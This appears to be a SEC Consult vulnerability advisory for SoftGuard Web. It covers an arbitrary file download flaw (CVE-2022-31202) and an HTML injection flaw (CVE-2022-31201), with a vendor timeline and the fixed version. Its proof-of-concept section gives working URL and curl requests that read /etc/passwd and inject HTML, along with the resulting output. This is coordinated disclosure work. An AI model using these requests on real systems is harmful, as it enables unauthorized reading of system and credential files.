@@ -1,0 +1,205 @@
+id: 37804
+date: 06/21/2022
+title: SoftGuard SNMP Network Management Extension HTML Injection / File Download Vulnerability
+author: Philipp Espernberger
+cves: CVE-2022-31201, CVE-2022-31202
+
+=======================================================================
+               title: Multiple vulnerabilities
+             product: SoftGuard SNMP Network Management Extension
+  vulnerable version: SoftGuard Web (SGW) < 5.1.5
+       fixed version: SoftGuard version 5.1.5 from 2022-06-01
+          CVE number: CVE-2022-31201, CVE-2022-31202
+              impact: High
+            homepage: https://gravitate.eu (reseller)
+               found: 2022-04-14
+                  by: Philipp Espernberger (Office Linz)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+There is no public description available for this vendor/product. The following
+description was provided as documentation:
+
+"SoftGuard is a network management extension which collects inventory-, analysis-
+and debugging data of devices and networks at least once a day. SoftGuard has an
+open structure, is built simple, is easily expandable, easy to use and is laid out
+for large scale networks. The data collection is performed with the protocols SNMP
+supporting the versions 1, 2c and 3. Additional protocols like ssh, telnet, rsh,
+https, NetBIOS/IP, ICMP ... complemented by SNMP if required.
+
+The SoftGuard Suite consists of three parts:
+
+* SoftGuard Network Center (SNC)
+* SoftGuard Host Center (SHC)
+* SoftGuard Monitor Center (SMC)
+
+Aditionally there are a bunch of common and customer specific expansions like
+SoftGuard Web (SGW), SoftGuard Statistic Tool (SST), Port Configuration Tool (PCT),
+Network Access Points (NAP), Technician Access Point (TAP), etc."
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to update to the latest version of SoftGuard (network management
+extension).
+
+An in-depth security analysis performed by security professionals is highly
+advised, to identify and resolve potential further critical security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) File System Access (CVE-2022-31202)
+The export function allows authenticated attackers to download any
+arbitrary local file from the file system due to insufficient input
+validation. The unfiltered URL parameter query enables an attacker to
+access arbitrary local files. This allows the attacker to define the
+complete path and the filename by himself. Files that include passwords
+and other sensitive information can be accessed.
+Furthermore, the built-in man functionality also allows attackers to
+read any arbitrary local file from the file system.
+
+2) HTML Injection (CVE-2022-31201)
+Various components do not properly sanitize/encode user input. This
+leads to HTML injection vulnerabilities. By exploiting this vulnerability,
+an attacker can include arbitrary HTML into the affected web page. The
+code is executed in the context of the victim's browser when visiting
+the manipulated URL. The vulnerability can be used to change the contents
+of the displayed site or redirect to other sites.
+
+During the security assessment it was not possible to execute JavaScript
+code because the security headers Content-Security-Policy and
+X-Content-Type-Options are preventing the execution.
+
+
+Proof of concept:
+-----------------
+1) File System Access (CVE-2022-31202)
+1a) Export functionality
+In order to access arbitrary local files, the export function as authenticated
+user (Administration -> User -> Access -> Export) can be used. The following URL
+was used to set the filename to /etc/passwd
+===============================================================================
+https://$host:8016/sgw/export?dbs=file&db=DefUser_access_$username_db%2e
+1649426888398872%2etmp&query=file%3a/etc/passwd'
+
+===============================================================================
+
+The newly set filename (/etc/passwd) can be exported and downloaded via the
+execution button. Afterwards the content of the file gets downloaded successfully.
+===============================================================================
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+[...]
+===============================================================================
+
+1b) MAN functionality
+The following curl command shows how an authenticated attacker can gain access
+to any arbitrary local file:
+===============================================================================
+curl 'https://$host:8016/cgi-bin/man.tcl' -H 'Authorization: Basic [...]'
+--data 'act=1&x=%2Fetc%2Fpasswd&submit=Execute' --compressed --insecure
+
+===============================================================================
+
+The curl response includes the contents of the file:
+===============================================================================
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" />
+[...]
+<pre>
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+[...]
+===============================================================================
+
+2) HTML Injection (CVE-2022-31201)
+When a new graph is created an authenticated attacker controls the GET parameters
+and can inject malicious content. The following curl command shows how an
+authenticated attacker can inject HTML code:
+===============================================================================
+curl 'https://$host:8016/sgw/graph?tbl=sgNode&t=percent&h=Status%3Ch1%3ESEC-
+Consult%3C/h1%3E+%23&v=%7bdown+1934+orange%7d+%7bicmp+555+red%7d+%7bsnmpaaaa+8723+green%7d&scale=5'
+-H 'Authorization: Basic [...]' --compressed --insecure
+
+===============================================================================
+
+The curl response includes the injected HTML code <h1>SEC Consult</h1>:
+===============================================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>SGW - Graph: Node</title>
+[...]
+</head>
+<body class="master">
+  [...]
+  <caption>∑3, Status<h1>SEC Consult</h1>, #11212</caption>
+  [...]
+  <tr><td>Status<h1>SEC Consult</h1></td>
+[...]
+</body></html>
+===============================================================================
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and found to be vulnerable:
+* SoftGuard Web (SGW) 5.1.3
+
+The vendor provided the following information regarding the affected versions:
+
+1a) affected version 4.5.0 (2019-05-04) to version 4.5.8 (2020-05-05)
+1b) since SoftGuard 2.0 with SoftGuard Web 1.0 (~1998/99)
+2)  since SoftGuard 3.6.0 (2009-10-31) / SoftGuard 3.6.6 (2011-02-15) with
+     SoftGuard Web 2.6.0/2.6.6
+
+
+Vendor contact timeline:
+------------------------
+2022-05-11: Contacting vendor through direct email address.
+2022-05-11: Sent encrypted security advisory to vendor
+2022-05-12: Received feedback from the vendor for the security advisory
+2022-05-16: Received confirmation that a new version of SoftGuard was
+             already rolled out to the customers which included the fix
+2022-05-16: Received additional information which versions are vulnerable
+2022-05-19: Received CVE numbers.
+2022-05-20: Reviewed the fixed version 5.1.4 and found that HTML injection
+             still works at other endpoints, other issues are fixed.
+2022-05-20: Vendor replies that new version 5.1.5. will be released on 1st June.
+2022-06-01: Vendor releases patched version 5.1.5.
+2022-06-09: Coordinated release of security advisory.
+
+
+Solution:
+---------
+The vendor rolled out new software versions. Affected users should verify that
+they are using the latest version available (5.1.5 from 2022-06-01 or higher).
+
+#  0day.today [2023-03-23]  #
